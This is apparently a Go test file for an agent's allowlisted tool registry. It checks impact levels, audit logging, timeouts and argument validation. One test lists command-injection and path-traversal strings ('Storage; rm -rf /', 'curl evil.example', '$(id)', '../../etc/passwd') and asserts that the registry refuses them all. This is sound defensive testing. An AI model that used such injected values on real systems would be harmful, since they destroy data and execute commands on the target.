package toolplane

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"
	"time"
)

// recorder captures audit records. It is mutex-guarded because the probe plane
// audits from the goroutine running a probe while the test reads: the real
// FileAuditor locks for the same reason, and an unguarded double would make
// the suite flaky under -race and hide a genuine race behind the noise.
type recorder struct {
	mu    sync.Mutex
	calls []ToolCall
}

func (r *recorder) RecordToolCall(c ToolCall) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.calls = append(r.calls, c)
}

// snapshot returns a copy for assertions taken while a probe may still be
// writing.
func (r *recorder) snapshot() []ToolCall {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]ToolCall{}, r.calls...)
}

// newTestRegistry returns a registry over the real allowlist whose executor is
// captured rather than run, so the suite never shells out and every assertion
// is about the argv that *would* have run.
func newTestRegistry(t *testing.T) (*Registry, *recorder, *[]string) {
	t.Helper()
	rec := &recorder{}
	r, err := New(Allowlist, rec)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	var lastArgv []string
	r.run = func(ctx context.Context, argv []string, maxBytes int) ([]byte, error) {
		lastArgv = argv
		return []byte("ok"), nil
	}
	return r, rec, &lastArgv
}

func TestShippedAllowlistRegisters(t *testing.T) {
	if _, err := New(Allowlist, &recorder{}); err != nil {
		t.Fatalf("the shipped allowlist does not register: %v", err)
	}
}

// A configuring tool registers — it is a well-formed tool — and then the
// cluster's own action level decides. At the default level nothing configuring
// is served, so a registry that was never told a level behaves exactly as the
// read-only plane did: it advertises no configuring tool and refuses any call
// to one. Both classes, so that splitting the old single mutating class did not
// quietly open one of them.
func TestNoConfiguringToolIsServedAtTheDefaultLevel(t *testing.T) {
	for _, impact := range []Impact{ImpactOperate, ImpactInternal} {
		r, err := New([]Tool{{
			Name: "restart_thing", Argv: []string{"systemctl", "restart", "thing"},
			Impact: impact,
		}}, &recorder{})
		if err != nil {
			t.Fatalf("a well-formed tool of impact %s should register: %v", impact, err)
		}
		if got := r.Names(); len(got) != 0 {
			t.Errorf("impact %s advertised at the default level: %v", impact, got)
		}
		if _, err := r.Call(context.Background(), "restart_thing", nil, true); !errors.Is(err, ErrRefusedAtLevel) {
			t.Errorf("call of impact %s: err = %v, want ErrRefusedAtLevel", impact, err)
		}
	}
	// An impact from a newer build is refused too, and says something
	// different: unrecognised is not the same as known-and-withheld.
	_, err := New([]Tool{{
		Name: "from_the_future", Argv: []string{"true"}, Impact: Impact(99),
	}}, &recorder{})
	if err == nil {
		t.Fatal("a tool declaring an unknown impact was registered")
	}
	if !strings.Contains(err.Error(), "reads and probes only") {
		t.Errorf("error should say why: %v", err)
	}
}

// A probe-class tool is refused unless this agent was built with a probe
// plane. Enabling probes is a deliberate act at construction; without it the
// scratch class is exactly as unservable as it was before probes existed.
func TestAScratchToolCannotRegisterWithoutAProbePlane(t *testing.T) {
	_, err := New([]Tool{{
		Name: "probe_fio_volume", Argv: []string{"fio", "--name", "x"},
		Impact: ImpactScratch,
	}}, &recorder{})
	if err == nil {
		t.Fatal("a load-generating tool was registered on an agent with no probe plane")
	}
	if !strings.Contains(err.Error(), "no probe plane") {
		t.Errorf("error should say why: %v", err)
	}
}

// Forgetting the field must not be a way in. The boolean this replaced failed
// closed on its zero value, and so does the enum.
func TestAToolThatDeclaresNoImpactCannotRegister(t *testing.T) {
	_, err := New([]Tool{{
		Name: "undeclared", Argv: []string{"hex_cli", "-c", "cluster", "-c", "check"},
	}}, &recorder{})
	if err == nil {
		t.Fatal("a tool that declared no impact was registered")
	}
	if !strings.Contains(err.Error(), "undeclared") {
		t.Errorf("error should name the undeclared impact: %v", err)
	}
}

// Malformed tools are caught when the agent starts, not when the SaaS happens
// to call the broken one.
func TestMalformedToolsAreRefusedAtRegistration(t *testing.T) {
	cases := []struct {
		name string
		tool Tool
	}{
		{"undeclared placeholder", Tool{
			Name: "x", Argv: []string{"hex_cli", "{group}"}, Impact: ImpactRead,
		}},
		{"declared but unused", Tool{
			Name: "x", Argv: []string{"hex_cli"}, Impact: ImpactRead,
			Params: map[string][]string{"{group}": {"Storage"}},
		}},
		{"parameter with no permitted values", Tool{
			Name: "x", Argv: []string{"hex_cli", "{group}"}, Impact: ImpactRead,
			Params: map[string][]string{"{group}": {}},
		}},
		{"parameterised executable", Tool{
			Name: "x", Argv: []string{"{prog}", "check"}, Impact: ImpactRead,
			Params: map[string][]string{"{prog}": {"hex_cli"}},
		}},
		{"empty argv", Tool{Name: "x", Impact: ImpactRead}},
		{"no name", Tool{Argv: []string{"hex_cli"}, Impact: ImpactRead}},
	}
	for _, c := range cases {
		if _, err := New([]Tool{c.tool}, &recorder{}); err == nil {
			t.Errorf("%s: registered without error", c.name)
		}
	}
}

func TestUnknownToolIsRefusedAndAudited(t *testing.T) {
	r, rec, _ := newTestRegistry(t)
	_, err := r.Call(context.Background(), "run_anything", nil, true)
	if !errors.Is(err, ErrUnknownTool) {
		t.Fatalf("err = %v, want ErrUnknownTool", err)
	}
	if len(rec.calls) != 1 || rec.calls[0].Allowed {
		t.Fatalf("refusal not audited: %+v", rec.calls)
	}
}

// The heart of it: a value the allowlist did not anticipate cannot reach the
// command line. These are refused because they are not in the permitted set —
// not because anything filtered them, which is the distinction that matters.
func TestArgumentsOutsideThePermittedSetAreRefused(t *testing.T) {
	r, rec, _ := newTestRegistry(t)
	hostile := []string{
		"Storage; rm -rf /",
		"Storage && curl evil.example",
		"Storage`id`",
		"$(id)",
		"../../etc/passwd",
		"Storage\nStorage",
		"-c",
		"--help",
		"",        // empty
		"storage", // right group, wrong case: exact match means exact
	}
	for _, v := range hostile {
		_, err := r.Call(context.Background(), "cluster_health", map[string]string{"{group}": v}, true)
		if !errors.Is(err, ErrBadArgument) {
			t.Errorf("value %q was not refused (err = %v)", v, err)
		}
	}
	for _, c := range rec.calls {
		if c.Allowed {
			t.Errorf("a hostile value was allowed: %+v", c)
		}
		// The refusal must not echo the value back — an error that repeats the
		// input turns the audit log into an oracle.
		if strings.Contains(c.Reason, "rm -rf") {
			t.Errorf("refusal echoed the rejected value: %q", c.Reason)
		}
	}
}

func TestPermittedArgumentsResolveIntoAFixedArgv(t *testing.T) {
	r, _, lastArgv := newTestRegistry(t)
	if _, err := r.Call(context.Background(), "cluster_health", map[string]string{"{group}": "Storage"}, true); err != nil {
		t.Fatalf("Call: %v", err)
	}
	want := []string{"hex_cli", "-c", "cluster", "-c", "health", "Storage"}
	if strings.Join(*lastArgv, "\x00") != strings.Join(want, "\x00") {
		t.Errorf("argv = %v, want %v", *lastArgv, want)
	}
}

func TestUnexpectedAndMissingArgumentsAreRefused(t *testing.T) {
	r, _, _ := newTestRegistry(t)
	// An argument the tool never declared.
	if _, err := r.Call(context.Background(), "cluster_check", map[string]string{"{group}": "Storage"}, true); !errors.Is(err, ErrBadArgument) {
		t.Errorf("undeclared argument accepted: %v", err)
	}
	// A declared argument left out.
	if _, err := r.Call(context.Background(), "cluster_health", nil, true); !errors.Is(err, ErrBadArgument) {
		t.Errorf("missing argument accepted: %v", err)
	}
}

// Every call lands in the log, allowed or not — that is what makes vendor
// access reviewable by the customer after the fact.
func TestEveryCallIsAudited(t *testing.T) {
	r, rec, _ := newTestRegistry(t)
	ctx := context.Background()
	_, _ = r.Call(ctx, "cluster_check", nil, true)                                          // allowed
	_, _ = r.Call(ctx, "cluster_health", map[string]string{"{group}": "nope"}, true)        // refused: bad value
	_, _ = r.Call(ctx, "nonexistent", nil, true)                                            // refused: unknown
	_, _ = r.Call(ctx, "cluster_health", map[string]string{"{group}": "ClusterLink"}, true) // allowed

	if len(rec.calls) != 4 {
		t.Fatalf("audited %d calls, want 4", len(rec.calls))
	}
	allowed := 0
	for _, c := range rec.calls {
		if c.Allowed {
			allowed++
			if len(c.Argv) == 0 {
				t.Error("an allowed call recorded no argv; the log must show what actually ran")
			}
		} else if c.Reason == "" {
			t.Error("a refusal recorded no reason")
		}
	}
	if allowed != 2 {
		t.Errorf("allowed = %d, want 2", allowed)
	}
}

func TestAuditRecordsAreReadableJSONLines(t *testing.T) {
	var buf closableBuffer
	a := NewWriterAuditor(&buf)
	a.RecordToolCall(ToolCall{
		At: time.Now().UTC(), Tool: "cluster_check", Allowed: true,
		Argv:     []string{"hex_cli", "-c", "cluster", "-c", "check"},
		Duration: 1500 * time.Millisecond, Bytes: 42,
	})
	line := strings.TrimSpace(buf.String())
	var got map[string]any
	if err := json.Unmarshal([]byte(line), &got); err != nil {
		t.Fatalf("audit line is not JSON: %v (%q)", err, line)
	}
	if got["tool"] != "cluster_check" || got["allowed"] != true {
		t.Errorf("record = %v", got)
	}
	if got["durationMs"].(float64) != 1500 {
		t.Errorf("durationMs = %v, want 1500 — humans read this log", got["durationMs"])
	}
}

func TestAnAuditorIsRequired(t *testing.T) {
	if _, err := New(Allowlist, nil); err == nil {
		t.Error("a registry without an auditor was allowed; every call must be inspectable")
	}
}

func TestNamesAreAdvertisedSorted(t *testing.T) {
	r, _, _ := newTestRegistry(t)
	got := r.Names()
	for i := 1; i < len(got); i++ {
		if got[i-1] > got[i] {
			t.Fatalf("Names not sorted: %v", got)
		}
	}
	// Not len(Allowlist): the test registry is at the default level, which
	// serves no configuring class, so the shipped write is registered and
	// deliberately not advertised.
	served := 0
	for _, tool := range Allowlist {
		if tool.Impact == ImpactRead {
			served++
		}
	}
	if len(got) != served {
		t.Errorf("advertised %d tools, %d of the allowlist are served at this level", len(got), served)
	}
	for _, n := range got {
		if n == "create_instance" {
			t.Error("a configuring tool was advertised at the default level")
		}
	}
}

type closableBuffer struct{ b strings.Builder }

func (c *closableBuffer) Write(p []byte) (int, error) { return c.b.Write(p) }
func (c *closableBuffer) Close() error                { return nil }
func (c *closableBuffer) String() string              { return c.b.String() }

func TestPerToolTimeoutWinsOverTheDefault(t *testing.T) {
	r, _, _ := newTestRegistry(t)

	var got time.Duration
	r.run = func(ctx context.Context, argv []string, maxBytes int) ([]byte, error) {
		dl, ok := ctx.Deadline()
		if !ok {
			t.Fatal("call context carries no deadline")
		}
		got = time.Until(dl)
		return []byte("ok"), nil
	}

	// cluster_check declares 100s; the deadline must reflect it, not the 60s
	// default. Generous tolerance — this asserts which bound applied, not
	// scheduler precision.
	if _, err := r.Call(context.Background(), "cluster_check", nil, true); err != nil {
		t.Fatalf("Call: %v", err)
	}
	if got < 90*time.Second || got > 100*time.Second {
		t.Errorf("cluster_check deadline ≈%s, want its declared 100s", got.Round(time.Second))
	}

	// cluster_health declares nothing; the registry default applies.
	if _, err := r.Call(context.Background(), "cluster_health", map[string]string{"{group}": "Storage"}, true); err != nil {
		t.Fatalf("Call: %v", err)
	}
	if got < 50*time.Second || got > 60*time.Second {
		t.Errorf("cluster_health deadline ≈%s, want the %s default", got.Round(time.Second), defaultTimeout)
	}
}

// TestATimedOutToolReturnsADistinguishableResult proves the fix for
// bigstack-oss/cube-advisor-agent#20: a killed process must not report the
// same "signal: killed" shape as a real crash. Both the caller's error and
// the audit log's reason must name the timeout, not the kill signal.
func TestATimedOutToolReturnsADistinguishableResult(t *testing.T) {
	rec := &recorder{}
	r, err := New([]Tool{{
		Name: "slow", Argv: []string{"true"}, Impact: ImpactRead,
		Timeout: 20 * time.Millisecond,
	}}, rec)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	r.run = func(ctx context.Context, argv []string, maxBytes int) ([]byte, error) {
		<-ctx.Done()
		return nil, fmt.Errorf("signal: killed")
	}

	_, err = r.Call(context.Background(), "slow", nil, true)
	if !errors.Is(err, ErrToolTimedOut) {
		t.Fatalf("err = %v, want ErrToolTimedOut", err)
	}
	if !strings.Contains(err.Error(), "20ms") {
		t.Errorf("error should name the limit that fired: %v", err)
	}
	if got := rec.calls[0].Reason; strings.Contains(got, "signal: killed") {
		t.Errorf("audit reason still shows the raw kill signal: %q", got)
	}
}

// A failure that is not a timeout — the process ran to completion and simply
// exited badly — must not be relabelled. Only ctx's own deadline earns the
// distinguishable message.
func TestAnOrdinaryFailureIsNotMislabelledATimeout(t *testing.T) {
	r, rec, _ := newTestRegistry(t)
	r.run = func(ctx context.Context, argv []string, maxBytes int) ([]byte, error) {
		return nil, fmt.Errorf("exit status 1")
	}
	_, err := r.Call(context.Background(), "cluster_check", nil, true)
	if errors.Is(err, ErrToolTimedOut) {
		t.Fatalf("an ordinary failure was reported as a timeout: %v", err)
	}
	if rec.calls[0].Reason != "exit status 1" {
		t.Errorf("audit reason = %q, want the original failure preserved", rec.calls[0].Reason)
	}
}

func TestANegativeTimeoutCannotRegister(t *testing.T) {
	_, err := New([]Tool{{
		Name:    "broken",
		Argv:    []string{"true"},
		Impact:  ImpactRead,
		Timeout: -time.Second,
	}}, &recorder{})
	if err == nil {
		t.Fatal("a negative timeout registered")
	}
}

// TestTimeoutLadderStaysOrdered pins the relationship the comments promise:
// every tool's effective timeout sits under the server's per-call cap, which
// sits under the SaaS's 120s channel deadline — so the timeout that fires is
// always the one that can still write an honest result back.
func TestTimeoutLadderStaysOrdered(t *testing.T) {
	const serverCallCap = 110 * time.Second // internal/agent defaultCallTimeout
	const saasDeadline = 120 * time.Second  // cube-ai-advisor cubecos callTimeout

	if serverCallCap >= saasDeadline {
		t.Errorf("server call cap %s must stay under the SaaS deadline %s", serverCallCap, saasDeadline)
	}
	for _, tool := range Allowlist {
		eff := tool.Timeout
		if eff == 0 {
			eff = defaultTimeout
		}
		if eff >= serverCallCap {
			t.Errorf("tool %s timeout %s reaches the server call cap %s; its own timeout would never fire",
				tool.Name, eff, serverCallCap)
		}
	}
}
